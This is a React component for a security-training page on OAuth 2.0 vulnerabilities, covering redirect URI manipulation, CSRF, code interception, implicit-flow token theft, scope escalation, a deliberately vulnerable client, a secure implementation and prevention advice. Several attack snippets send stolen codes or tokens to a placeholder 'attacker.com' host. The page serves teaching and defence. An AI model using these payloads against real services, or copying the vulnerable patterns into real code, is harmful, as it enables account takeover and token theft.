
import React from 'react';
import { Lock } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const OAuthVulnerabilities: React.FC = () => {
  return (
    <section id="oauth" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">OAuth Vulnerabilities</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Attack Overview</h4>
        <p className="mb-4">
          OAuth 2.0 is a widely adopted authorization framework that allows applications to access resources on behalf of users
          without exposing their credentials. However, OAuth implementations are frequently misconfigured or contain 
          implementation flaws that can lead to severe security vulnerabilities including account takeover, 
          token theft, and unauthorized resource access.
        </p>
        
        <div className="bg-cybr-muted/20 p-4 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-3">What Attackers Try to Achieve</h5>
          <ul className="list-disc pl-6 space-y-2">
            <li><strong>Account Takeover:</strong> Gain complete control over victim's account through token theft</li>
            <li><strong>Data Exfiltration:</strong> Access sensitive user data and resources without authorization</li>
            <li><strong>Token Theft:</strong> Steal access tokens to impersonate legitimate users</li>
            <li><strong>Privilege Escalation:</strong> Obtain higher-level permissions than originally granted</li>
            <li><strong>Session Hijacking:</strong> Intercept and reuse OAuth tokens for unauthorized access</li>
            <li><strong>Cross-Site Request Forgery:</strong> Force users to perform unwanted OAuth authorizations</li>
          </ul>
        </div>

        <div className="bg-cybr-muted/20 p-4 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-3">Commonly Vulnerable Components</h5>
          <ul className="list-disc pl-6 space-y-2">
            <li><strong>Authorization Endpoints:</strong> URLs handling OAuth authorization requests</li>
            <li><strong>Token Endpoints:</strong> Endpoints responsible for token exchange and validation</li>
            <li><strong>Redirect URIs:</strong> Callback URLs where authorization codes/tokens are sent</li>
            <li><strong>Client Applications:</strong> Web, mobile, and SPA applications using OAuth</li>
            <li><strong>Resource Servers:</strong> APIs that accept and validate OAuth tokens</li>
            <li><strong>Authorization Servers:</strong> Services that issue and manage OAuth tokens</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why OAuth Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-3 mb-6">
          <li><strong>Implementation Complexity:</strong> OAuth's flexibility leads to numerous implementation mistakes</li>
          <li><strong>Redirect URI Validation:</strong> Insufficient validation allows token theft through malicious redirects</li>
          <li><strong>State Parameter Omission:</strong> Missing or weak state parameters enable CSRF attacks</li>
          <li><strong>Implicit Flow Usage:</strong> Less secure flow exposes tokens in browser history and logs</li>
          <li><strong>PKCE Absence:</strong> Public clients without PKCE are vulnerable to code interception</li>
          <li><strong>Scope Creep:</strong> Applications requesting excessive permissions without proper validation</li>
          <li><strong>Token Storage Issues:</strong> Insecure storage of tokens in client applications</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Common Attack Vectors & Payloads</h4>
        
        <h5 className="text-lg font-medium mb-3">1. Redirect URI Manipulation</h5>
        <CodeExample 
          language="http" 
          isVulnerable={true}
          title="Malicious Redirect URI Attack" 
          code={`# Original legitimate authorization request
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://legitimate-app.com/callback&
  scope=read_profile&
  state=random_state_value

# Attack 1: Subdomain hijacking
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://evil.legitimate-app.com/callback&
  scope=read_profile&
  state=random_state_value

# Attack 2: Path traversal
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://legitimate-app.com/callback/../../../evil&
  scope=read_profile&
  state=random_state_value

# Attack 3: Open redirect exploitation
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://legitimate-app.com/callback?redirect=https://evil.com&
  scope=read_profile&
  state=random_state_value

# Attack 4: Partial URL matching bypass
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://legitimate-app.com.evil.com/callback&
  scope=read_profile&
  state=random_state_value`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">2. State Parameter Attacks (CSRF)</h5>
        <CodeExample 
          language="html" 
          isVulnerable={true}
          title="OAuth CSRF Attack" 
          code={`<!-- Attacker creates malicious page to force OAuth authorization -->
<!DOCTYPE html>
<html>
<head>
    <title>Free Gift Card!</title>
</head>
<body>
    <h1>Claim Your Free $100 Gift Card!</h1>
    <p>Click the button below to claim your gift card!</p>
    
    <!-- Hidden iframe that automatically initiates OAuth flow -->
    <iframe src="https://oauth-provider.com/authorize?
                  response_type=code&
                  client_id=ATTACKERS_CLIENT_ID&
                  redirect_uri=https://attacker-app.com/callback&
                  scope=read_profile%20write_posts&
                  state=&
                  approval_prompt=auto"
            style="display:none;">
    </iframe>
    
    <!-- Or using auto-redirect -->
    <script>
        // Redirect victim to OAuth authorization without state parameter
        setTimeout(() => {
            window.location.href = "https://oauth-provider.com/authorize?" +
                "response_type=code&" +
                "client_id=ATTACKERS_CLIENT_ID&" +
                "redirect_uri=https://attacker-app.com/callback&" +
                "scope=read_profile%20write_posts&" +
                "approval_prompt=auto";
        }, 5000);
    </script>
</body>
</html>

<!-- Alternative: Using form auto-submission -->
<form id="oauthAttack" method="GET" action="https://oauth-provider.com/authorize">
    <input type="hidden" name="response_type" value="code">
    <input type="hidden" name="client_id" value="ATTACKERS_CLIENT_ID">
    <input type="hidden" name="redirect_uri" value="https://attacker-app.com/callback">
    <input type="hidden" name="scope" value="read_profile write_posts">
    <!-- No state parameter -->
</form>
<script>
    document.getElementById('oauthAttack').submit();
</script>`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">3. Code Interception (PKCE Bypass)</h5>
        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Authorization Code Interception Attack" 
          code={`// Attack scenario: Malicious app on mobile device intercepts authorization code

// 1. Attacker registers malicious app with same custom URL scheme
// AndroidManifest.xml (Malicious App)
/*
<activity android:name=".MaliciousActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <!-- Same scheme as legitimate app -->
        <data android:scheme="legitimateapp" />
    </intent-filter>
</activity>
*/

// 2. Legitimate app initiates OAuth flow without PKCE
const authUrl = "https://oauth-provider.com/authorize?" +
    "response_type=code&" +
    "client_id=LEGITIMATE_CLIENT_ID&" +
    "redirect_uri=legitimateapp://callback&" +
    "scope=read_profile";

// User authorizes and code is sent to: legitimateapp://callback?code=AUTHORIZATION_CODE

// 3. Malicious app intercepts the callback
class MaliciousActivity {
    onNewIntent(intent) {
        const data = intent.getData();
        if (data && data.getScheme() === "legitimateapp") {
            const code = data.getQueryParameter("code");
            
            // Attacker steals the authorization code
            this.stealAuthorizationCode(code);
        }
    }
    
    stealAuthorizationCode(code) {
        // Send stolen code to attacker's server
        fetch("https://attacker.com/steal", {
            method: "POST",
            body: JSON.stringify({ stolen_code: code })
        });
        
        // Optionally exchange code for token using legitimate client credentials
        this.exchangeCodeForToken(code);
    }
    
    exchangeCodeForToken(code) {
        // If attacker knows client credentials (public client)
        fetch("https://oauth-provider.com/token", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
                grant_type: "authorization_code",
                code: code,
                client_id: "LEGITIMATE_CLIENT_ID",
                redirect_uri: "legitimateapp://callback"
                // No PKCE verifier needed - vulnerability!
            })
        }).then(response => response.json())
          .then(tokens => {
              // Attacker now has valid access token
              this.useTokens(tokens);
          });
    }
}`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">4. Implicit Flow Token Theft</h5>
        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Implicit Flow Vulnerabilities" 
          code={`// Vulnerable implicit flow implementation
function initiateImplicitFlow() {
    // Using implicit flow (response_type=token) - vulnerable
    const authUrl = "https://oauth-provider.com/authorize?" +
        "response_type=token&" +
        "client_id=CLIENT_ID&" +
        "redirect_uri=https://myapp.com/callback&" +
        "scope=read_profile%20write_posts";
    
    window.location.href = authUrl;
}

// Attack vector 1: Browser history exposure
// After authorization, URL becomes:
// https://myapp.com/callback#access_token=SECRET_TOKEN&token_type=bearer&expires_in=3600

// Token is now in:
// - Browser history
// - Server access logs
// - Referrer headers
// - Shared/stolen browser sessions

// Attack vector 2: XSS token theft
function handleCallback() {
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(hash);
    const accessToken = params.get('access_token');
    
    // Vulnerable: Token exposed to JavaScript
    // XSS payload can steal token:
    console.log('Token:', accessToken); // Logged in console
    localStorage.setItem('token', accessToken); // Accessible to XSS
    
    // Malicious script injected via XSS:
    // <script>
    //   const token = localStorage.getItem('token') || 
    //                 new URLSearchParams(location.hash.substring(1)).get('access_token');
    //   fetch('https://attacker.com/steal?token=' + token);
    // </script>
}

// Attack vector 3: Postmessage interception
window.addEventListener('message', function(event) {
    // Malicious iframe can listen for token
    if (event.data.access_token) {
        // Send token to attacker
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify({ token: event.data.access_token })
        });
    }
});

// Attack vector 4: Referer header leakage
function makeAPICall(token) {
    // Token in URL parameters
    window.location.href = 'https://api.example.com/data?access_token=' + token;
    // Referer header will contain the token when navigating to external sites
}`} 
        />

        <h5 className="text-lg font-medium mb-3 mt-6">5. Scope Escalation & Permission Abuse</h5>
        <CodeExample 
          language="http" 
          isVulnerable={true}
          title="Scope Escalation Attacks" 
          code={`# Attack 1: Requesting excessive scopes
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://app.com/callback&
  scope=read_profile%20write_posts%20admin%20delete_account%20financial_data&
  state=abc123

# Attack 2: Scope injection
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://app.com/callback&
  scope=read_profile%20admin%20scope=write_posts%20admin&
  state=abc123

# Attack 3: Using wildcard scopes
GET /oauth/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://app.com/callback&
  scope=*%20admin%20root&
  state=abc123

# Attack 4: Token scope modification
POST /oauth/token HTTP/1.1
Host: oauth-provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTHORIZATION_CODE&
client_id=CLIENT_ID&
client_secret=CLIENT_SECRET&
redirect_uri=https://app.com/callback&
scope=admin%20write_all%20delete_users
# Requesting different/elevated scopes during token exchange`} 
        />
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 1: OAuth Flow Discovery</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Identify OAuth Endpoints:</strong> Find authorization, token, and userinfo endpoints</li>
            <li><strong>Analyze Client Registration:</strong> Determine client type (public/confidential)</li>
            <li><strong>Map OAuth Flows:</strong> Identify which flows are supported (code, implicit, hybrid)</li>
            <li><strong>Document Parameters:</strong> List all accepted parameters and their validation</li>
            <li><strong>Check for Documentation:</strong> Look for .well-known/oauth-authorization-server</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 2: Parameter Analysis</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Redirect URI Testing:</strong> Test various redirect URI manipulations</li>
            <li><strong>State Parameter Analysis:</strong> Check if state is required and properly validated</li>
            <li><strong>Scope Enumeration:</strong> Test different scope combinations and values</li>
            <li><strong>Client ID Validation:</strong> Test client ID spoofing and enumeration</li>
            <li><strong>Response Type Testing:</strong> Try different response types and combinations</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 3: Flow-Specific Testing</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Authorization Code Flow:</strong> Test PKCE implementation and code interception</li>
            <li><strong>Implicit Flow:</strong> Look for token exposure in logs, history, and referrers</li>
            <li><strong>Hybrid Flow:</strong> Test mixed response types for token leakage</li>
            <li><strong>Client Credentials Flow:</strong> Test for credential stuffing and enumeration</li>
            <li><strong>Device Flow:</strong> Test device code validation and polling abuse</li>
          </ol>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Phase 4: Token & Session Testing</h5>
          <ol className="list-decimal pl-6 space-y-2">
            <li><strong>Token Validation:</strong> Test token format, encryption, and validation logic</li>
            <li><strong>Token Lifetime:</strong> Check refresh token rotation and expiration</li>
            <li><strong>Token Revocation:</strong> Test token revocation mechanisms</li>
            <li><strong>Cross-Client Token Usage:</strong> Try using tokens across different clients</li>
            <li><strong>Token Storage:</strong> Analyze how tokens are stored client-side</li>
          </ol>
        </div>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Vulnerable OAuth Client Implementation" 
        code={`// Insecure OAuth client with multiple vulnerabilities
class VulnerableOAuthClient {
    constructor() {
        this.clientId = 'public_client_123';
        this.redirectUri = 'https://myapp.com/callback';
        this.authEndpoint = 'https://oauth-provider.com/authorize';
        this.tokenEndpoint = 'https://oauth-provider.com/token';
    }
    
    // Vulnerable authorization initiation
    initiateLogin() {
        // Missing state parameter - CSRF vulnerable
        // Using implicit flow - token exposure
        // Requesting excessive scopes
        const authUrl = this.authEndpoint + '?' +
            'response_type=token&' +
            'client_id=' + this.clientId + '&' +
            'redirect_uri=' + encodeURIComponent(this.redirectUri) + '&' +
            'scope=read_profile%20write_posts%20admin%20delete_account';
        
        window.location.href = authUrl;
    }
    
    // Vulnerable callback handling
    handleCallback() {
        const hash = window.location.hash.substring(1);
        const params = new URLSearchParams(hash);
        const accessToken = params.get('access_token');
        const error = params.get('error');
        
        if (error) {
            // Detailed error info leaked to user
            alert('OAuth Error: ' + error + ' - ' + params.get('error_description'));
            return;
        }
        
        if (accessToken) {
            // Insecure token storage
            localStorage.setItem('oauth_token', accessToken);
            
            // Token logged in console
            console.log('Received access token:', accessToken);
            
            // Token sent in URL parameters (referrer leakage)
            this.fetchUserProfile(accessToken);
        }
    }
    
    // Insecure API calls
    fetchUserProfile(token) {
        // Token in URL - logged in server access logs
        return fetch(\`https://api.example.com/profile?access_token=\${token}\`)
            .then(response => response.json())
            .then(data => {
                // XSS vulnerability if data not sanitized
                document.getElementById('profile').innerHTML = 
                    '<h1>Welcome ' + data.name + '</h1>';
            })
            .catch(error => {
                // Detailed error information exposed
                console.error('API Error:', error);
                alert('Error: ' + error.message);
            });
    }
    
    // Vulnerable token refresh
    refreshToken() {
        const refreshToken = localStorage.getItem('refresh_token');
        
        // No validation of refresh token
        return fetch(this.tokenEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: refreshToken,
                client_id: this.clientId
                // No client authentication for public client
            })
        })
        .then(response => response.json())
        .then(data => {
            // Overwrite tokens without rotation
            localStorage.setItem('oauth_token', data.access_token);
            if (data.refresh_token) {
                localStorage.setItem('refresh_token', data.refresh_token);
            }
        });
    }
    
    // No proper logout
    logout() {
        // Only clears local storage - tokens remain valid
        localStorage.removeItem('oauth_token');
        localStorage.removeItem('refresh_token');
        // Should revoke tokens on server
    }
}

// Usage with vulnerabilities
const oauthClient = new VulnerableOAuthClient();

// Vulnerable CSRF attack handler
window.addEventListener('message', function(event) {
    // No origin validation
    if (event.data.action === 'oauth_login') {
        oauthClient.initiateLogin();
    }
});

// Vulnerable automatic token usage
setInterval(() => {
    const token = localStorage.getItem('oauth_token');
    if (token) {
        // Automatic API calls with potentially compromised token
        oauthClient.fetchUserProfile(token);
    }
}, 60000);`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing Tools & Techniques</h4>
        
        <div className="grid md:grid-cols-2 gap-6 mb-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Automated Tools</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>OAuth2 Security Scanner:</strong> Automated OAuth flow testing</li>
              <li><strong>Burp Suite OAuth Extensions:</strong> OAuth-specific vulnerability scanning</li>
              <li><strong>OWASP ZAP:</strong> OAuth security testing capabilities</li>
              <li><strong>Postman:</strong> OAuth flow testing and automation</li>
              <li><strong>Custom Scripts:</strong> Python/Node.js OAuth testing frameworks</li>
            </ul>
          </div>
          
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Manual Testing Tools</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>Browser Developer Tools:</strong> Monitor network requests and responses</li>
              <li><strong>Proxy Tools:</strong> Intercept and modify OAuth requests</li>
              <li><strong>JWT Debugger:</strong> Analyze JWT token structure and claims</li>
              <li><strong>URL Manipulation:</strong> Test parameter validation manually</li>
              <li><strong>Mobile Debugging:</strong> Proxy mobile OAuth flows</li>
            </ul>
          </div>
        </div>

        <div className="bg-cybr-muted/10 p-6 rounded-lg mb-6">
          <h5 className="text-lg font-medium mb-4">Comprehensive Testing Checklist</h5>
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <h6 className="font-medium mb-2">Authorization Endpoint Testing</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Test redirect_uri validation</li>
                <li>Check state parameter enforcement</li>
                <li>Verify scope validation</li>
                <li>Test client_id enumeration</li>
                <li>Check response_type validation</li>
                <li>Test PKCE implementation</li>
              </ul>
            </div>
            <div>
              <h6 className="font-medium mb-2">Token Endpoint Testing</h6>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Test client authentication</li>
                <li>Verify code validation</li>
                <li>Check token format and structure</li>
                <li>Test refresh token rotation</li>
                <li>Verify scope enforcement</li>
                <li>Test token lifetime</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure OAuth Implementation" 
        code={`// Secure OAuth client implementation with proper security measures
class SecureOAuthClient {
    constructor() {
        this.clientId = 'secure_client_456';
        this.redirectUri = 'https://myapp.com/oauth/callback';
        this.authEndpoint = 'https://oauth-provider.com/authorize';
        this.tokenEndpoint = 'https://oauth-provider.com/token';
        this.revokeEndpoint = 'https://oauth-provider.com/revoke';
    }
    
    // Secure authorization initiation with PKCE
    async initiateLogin() {
        // Generate secure random state for CSRF protection
        const state = this.generateSecureRandom(32);
        sessionStorage.setItem('oauth_state', state);
        
        // Generate PKCE challenge for public clients
        const codeVerifier = this.generateSecureRandom(64);
        const codeChallenge = await this.generateCodeChallenge(codeVerifier);
        sessionStorage.setItem('code_verifier', codeVerifier);
        
        // Use authorization code flow (more secure than implicit)
        const authUrl = this.authEndpoint + '?' + new URLSearchParams({
            response_type: 'code',
            client_id: this.clientId,
            redirect_uri: this.redirectUri,
            scope: 'read_profile', // Minimal required scopes only
            state: state,
            code_challenge: codeChallenge,
            code_challenge_method: 'S256'
        });
        
        window.location.href = authUrl;
    }
    
    // Secure callback handling
    async handleCallback() {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');
        const storedState = sessionStorage.getItem('oauth_state');
        
        // Clear stored state immediately
        sessionStorage.removeItem('oauth_state');
        
        if (error) {
            // Generic error message - no sensitive info
            this.handleError('Authentication failed. Please try again.');
            return;
        }
        
        // Validate state parameter to prevent CSRF
        if (!state || !storedState || state !== storedState) {
            this.handleError('Invalid state parameter. Authentication failed.');
            return;
        }
        
        if (code) {
            try {
                await this.exchangeCodeForToken(code);
            } catch (error) {
                this.handleError('Token exchange failed. Please try again.');
            }
        }
    }
    
    // Secure token exchange
    async exchangeCodeForToken(code) {
        const codeVerifier = sessionStorage.getItem('code_verifier');
        sessionStorage.removeItem('code_verifier');
        
        if (!codeVerifier) {
            throw new Error('Missing code verifier');
        }
        
        // Exchange code for token server-side to protect client credentials
        const response = await fetch('/api/oauth/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest' // CSRF protection
            },
            credentials: 'same-origin', // Include cookies
            body: JSON.stringify({
                code: code,
                code_verifier: codeVerifier,
                redirect_uri: this.redirectUri
            })
        });
        
        if (!response.ok) {
            throw new Error('Token exchange failed');
        }
        
        // Server sets HttpOnly cookie with token
        // No token stored in localStorage/sessionStorage
        const data = await response.json();
        
        if (data.success) {
            // Redirect to protected area
            window.location.href = '/dashboard';
        } else {
            throw new Error('Token exchange failed');
        }
    }
    
    // Secure API calls with proper token handling
    async makeAuthenticatedRequest(url, options = {}) {
        // Token sent via HttpOnly cookie automatically
        const defaultOptions = {
            credentials: 'same-origin',
            headers: {
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/json',
                ...options.headers
            }
        };
        
        const response = await fetch(url, { ...defaultOptions, ...options });
        
        if (response.status === 401) {
            // Token expired - attempt refresh
            const refreshed = await this.refreshToken();
            if (refreshed) {
                // Retry original request
                return fetch(url, { ...defaultOptions, ...options });
            } else {
                // Refresh failed - redirect to login
                this.logout();
                throw new Error('Authentication required');
            }
        }
        
        return response;
    }
    
    // Secure token refresh
    async refreshToken() {
        try {
            const response = await fetch('/api/oauth/refresh', {
                method: 'POST',
                credentials: 'same-origin',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
            
            return response.ok;
        } catch (error) {
            console.error('Token refresh failed:', error);
            return false;
        }
    }
    
    // Proper logout with token revocation
    async logout() {
        try {
            // Revoke tokens server-side
            await fetch('/api/oauth/logout', {
                method: 'POST',
                credentials: 'same-origin',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });
        } catch (error) {
            console.error('Logout error:', error);
        } finally {
            // Clear any client-side state
            sessionStorage.clear();
            // Redirect to login page
            window.location.href = '/login';
        }
    }
    
    // Utility functions
    generateSecureRandom(length) {
        const array = new Uint8Array(length);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }
    
    async generateCodeChallenge(verifier) {
        const encoder = new TextEncoder();
        const data = encoder.encode(verifier);
        const digest = await crypto.subtle.digest('SHA-256', data);
        return btoa(String.fromCharCode(...new Uint8Array(digest)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    }
    
    handleError(message) {
        // Log error for debugging (server-side)
        console.error('OAuth Error:', message);
        
        // Show generic user-friendly message
        alert(message);
        
        // Redirect to safe page
        window.location.href = '/login';
    }
}

// Server-side token endpoint (Express.js example)
app.post('/api/oauth/token', async (req, res) => {
    const { code, code_verifier, redirect_uri } = req.body;
    
    // Validate inputs
    if (!code || !code_verifier || !redirect_uri) {
        return res.status(400).json({ error: 'Missing required parameters' });
    }
    
    // Validate redirect URI matches registered URI exactly
    if (redirect_uri !== process.env.REGISTERED_REDIRECT_URI) {
        return res.status(400).json({ error: 'Invalid redirect URI' });
    }
    
    try {
        // Exchange code for token with OAuth provider
        const tokenResponse = await fetch('https://oauth-provider.com/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': \`Basic \${Buffer.from(\`\${process.env.CLIENT_ID}:\${process.env.CLIENT_SECRET}\`).toString('base64')}\`
            },
            body: new URLSearchParams({
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: redirect_uri,
                code_verifier: code_verifier
            })
        });
        
        const tokenData = await tokenResponse.json();
        
        if (!tokenResponse.ok) {
            return res.status(400).json({ error: 'Token exchange failed' });
        }
        
        // Store tokens securely server-side
        const sessionId = generateSecureSessionId();
        await storeTokensSecurely(sessionId, tokenData);
        
        // Set secure HttpOnly cookie
        res.cookie('session_id', sessionId, {
            httpOnly: true,
            secure: true,
            sameSite: 'strict',
            maxAge: tokenData.expires_in * 1000
        });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Token exchange error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention Strategies</h4>
        
        <div className="grid md:grid-cols-2 gap-6 mb-6">
          <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20">
            <h5 className="text-lg font-medium mb-3 text-green-400">Authorization Security</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Use authorization code flow with PKCE</li>
              <li>Implement strict redirect URI validation</li>
              <li>Always use and validate state parameter</li>
              <li>Avoid implicit flow for sensitive applications</li>
              <li>Implement proper scope validation</li>
              <li>Use shortest possible token lifetimes</li>
            </ul>
          </div>
          
          <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20">
            <h5 className="text-lg font-medium mb-3 text-green-400">Token Security</h5>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Store tokens in HttpOnly cookies</li>
              <li>Implement proper token revocation</li>
              <li>Use refresh token rotation</li>
              <li>Validate token audience and issuer</li>
              <li>Implement token binding mechanisms</li>
              <li>Never log tokens or send in URLs</li>
            </ul>
          </div>
        </div>

        <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/20 mb-6">
          <h5 className="text-lg font-medium mb-3 text-green-400">Development Environment Considerations</h5>
          <ul className="list-disc pl-6 space-y-2 text-sm">
            <li><strong>Web Applications:</strong> Use server-side token storage, implement CSRF protection</li>
            <li><strong>Single Page Applications:</strong> Always use PKCE, avoid implicit flow</li>
            <li><strong>Mobile Applications:</strong> Use custom URL schemes carefully, implement certificate pinning</li>
            <li><strong>Native Applications:</strong> Use system browser for OAuth, implement deep link validation</li>
            <li><strong>Server-to-Server:</strong> Use client credentials flow with mutual TLS</li>
            <li><strong>Microservices:</strong> Implement token forwarding and validation consistently</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Cases & Advanced Scenarios</h4>
        
        <div className="space-y-6">
          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">OpenID Connect (OIDC) Security</h5>
            <p className="text-sm mb-2">
              OIDC adds identity layer on top of OAuth 2.0, introducing additional security considerations
              around ID tokens, userinfo endpoints, and identity verification.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Validate ID token signatures and claims properly</li>
              <li>Implement nonce parameter for replay protection</li>
              <li>Verify ID token audience matches client ID</li>
              <li>Use proper key rotation for JWT validation</li>
              <li>Implement userinfo endpoint protection</li>
            </ul>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Mobile OAuth Security</h5>
            <p className="text-sm mb-2">
              Mobile OAuth implementations face unique challenges including deep link interception,
              malicious app installation, and secure storage limitations.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Use claimed HTTPS redirects instead of custom schemes</li>
              <li>Implement app attestation for mobile clients</li>
              <li>Use secure enclave/keystore for token storage</li>
              <li>Validate app signatures and certificates</li>
              <li>Implement runtime application self-protection (RASP)</li>
            </ul>
          </div>

          <div className="bg-cybr-muted/20 p-4 rounded-lg">
            <h5 className="text-lg font-medium mb-3">Federation & Multi-Provider Scenarios</h5>
            <p className="text-sm mb-2">
              Applications supporting multiple OAuth providers or federated identity scenarios
              introduce additional complexity and potential security vulnerabilities.
            </p>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li>Implement provider-specific validation logic</li>
              <li>Prevent account linking/confusion attacks</li>
              <li>Validate issuer claims in federated scenarios</li>
              <li>Implement proper session management across providers</li>
              <li>Handle provider-specific error conditions securely</li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};

export default OAuthVulnerabilities;
